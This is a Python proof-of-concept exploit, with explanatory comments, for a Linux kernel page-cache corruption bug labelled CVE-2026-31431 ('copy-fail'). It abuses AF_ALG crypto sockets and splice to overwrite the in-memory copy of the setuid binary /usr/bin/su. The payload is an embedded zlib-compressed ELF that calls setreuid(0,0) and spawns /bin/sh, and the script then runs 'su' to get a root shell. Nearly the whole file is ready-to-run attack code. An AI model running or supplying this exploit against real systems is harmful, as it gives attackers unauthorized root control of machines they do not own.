#!/usr/bin/env python3
# Deobfuscated PoC for CVE-2026-31431 ("copy-fail").
#
# Original: copy_fail_exp.py (one-letter aliases, raw numeric constants, hex blobs).
# This file: same behavior, named constants, explanatory comments.
#
# Bug class: page-cache corruption via AF_ALG splice. Spliced page-cache pages
# are handed to the kernel crypto layer which writes attacker-supplied bytes
# back into them without a defensive copy. We use this to overwrite the
# in-memory copy of /usr/bin/su (a setuid-root binary) with a tiny static ELF
# that does setreuid(0,0) + execve("/bin/sh"), then exec it via system("su").
# The on-disk file is never modified.

import os
import socket
import zlib

# --- AF_ALG (kernel crypto socket) constants ---------------------------------
AF_ALG = 38
SOCK_SEQPACKET = 5
SOL_ALG = 279

ALG_SET_KEY            = 1
ALG_SET_OP             = 2
ALG_SET_IV             = 3
ALG_SET_AEAD_ASSOCLEN  = 4
ALG_SET_AEAD_AUTHSIZE  = 5

MSG_MORE = 0x8000  # keep the AF_ALG request open so splice payload appends

# --- Crypto parameters chosen to reach the buggy code path -------------------
#
# 40-byte AEAD key blob for authenc-style algorithms:
#   rtattr header (4B): rta_len=8, rta_type=1 (CRYPTO_AUTHENC_KEYA_PARAM)
#   enckeylen (4B BE): 16  -> AES-128 split
#   key bytes (32B):   16B HMAC key + 16B AES key, all zeros
# Zero key/IV: not for cryptographic reasons - just the laziest way to keep
# the kernel from rejecting the request before we reach the bug.
AEAD_KEY = bytes.fromhex("0800010000000010" + "00" * 32)

AAD_LEN     = 8   # associated-data length (first 8 bytes of input are AAD)
AUTH_SIZE   = 4   # auth tag size; also the per-iteration write granularity
OP_VALUE    = 0x10  # not ALG_OP_DECRYPT(0) or ALG_OP_ENCRYPT(1); kernel
                    # validation lets it through, downstream code takes the
                    # encrypt branch (truthy) but with corrupted state.
IV_BYTES    = b"\x00" * 4   # AES-CBC normally wants 16; undersized on purpose

TARGET_PATH = "/usr/bin/su"

# Pre-built tiny x86-64 static ELF (160 bytes) that, when run, does
# setreuid(0, 0); execve("/bin/sh", NULL, NULL).
# Stored zlib-compressed because the original PoC did the same.
PATCH_ELF = zlib.decompress(bytes.fromhex(
    "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d"
    "209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675"
    "c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
))


def overwrite_chunk(file_fd: int, offset: int, four_bytes: bytes) -> None:
    """Overwrite 4 bytes at `offset` in the page-cache copy of file_fd."""
    sock = socket.socket(AF_ALG, SOCK_SEQPACKET, 0)
    # authencesn = "authenc with extended sequence number" (IPsec ESP-ESN).
    # Its internal AAD/IV layout assumptions are what reach the bug; other
    # AEADs like gcm(aes) don't trigger it.
    sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    sock.setsockopt(SOL_ALG, ALG_SET_KEY, AEAD_KEY)
    sock.setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, None, AUTH_SIZE)

    op_sock, _ = sock.accept()

    # 8-byte sendmsg payload becomes the AAD (assoclen=8). The splice that
    # follows feeds page-cache-backed plaintext.
    op_sock.sendmsg(
        [b"AAAA" + four_bytes],
        [
            (SOL_ALG, ALG_SET_IV,            IV_BYTES),
            (SOL_ALG, ALG_SET_OP,            bytes([OP_VALUE]) + b"\x00" * 19),
            (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, bytes([AAD_LEN])  + b"\x00" * 3),
        ],
        MSG_MORE,
    )

    splice_len = offset + 4

    # Zero-copy: page-cache pages of /usr/bin/su land in the pipe directly.
    pipe_r, pipe_w = os.pipe()
    os.splice(file_fd, pipe_w, splice_len, offset_src=0)
    # And then directly into the AF_ALG socket - no defensive copy. The bug.
    os.splice(pipe_r, op_sock.fileno(), splice_len)

    try:
        op_sock.recv(8 + offset)
    except OSError:
        pass

    os.close(pipe_r)
    os.close(pipe_w)
    op_sock.close()
    sock.close()


def main() -> None:
    fd = os.open(TARGET_PATH, os.O_RDONLY)
    try:
        for i in range(0, len(PATCH_ELF), AUTH_SIZE):
            overwrite_chunk(fd, i, PATCH_ELF[i:i + AUTH_SIZE])
    finally:
        os.close(fd)

    # /usr/bin/su is setuid-root. The kernel will exec our patched page-cache
    # version, which spawns /bin/sh as uid 0.
    os.system("su")


if __name__ == "__main__":
    main()
